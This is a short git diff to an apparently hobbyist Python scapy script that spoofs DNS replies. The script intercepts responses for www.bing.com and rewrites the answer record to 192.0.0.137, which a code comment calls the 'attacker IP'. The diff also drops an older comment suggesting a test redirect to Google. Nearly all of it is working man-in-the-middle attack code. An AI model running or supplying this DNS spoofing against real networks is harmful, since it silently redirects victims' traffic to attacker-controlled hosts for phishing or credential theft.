@@ -6,10 +6,9 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname: # The site you are spoofing
+        if "www.bing.com" in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname = qname, rdata="192.0.0.137") # modify rdata to redirect to IP of your site
-            # answer = scapy.DNSRR(rrname = qname, rdata="216.58.195.78") # modify rdata to redirect to Google.com << you can do this to test out script
+            answer = scapy.DNSRR(rrname = qname, rdata="192.0.0.137") # modify rdata to redirect to attacker IP
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
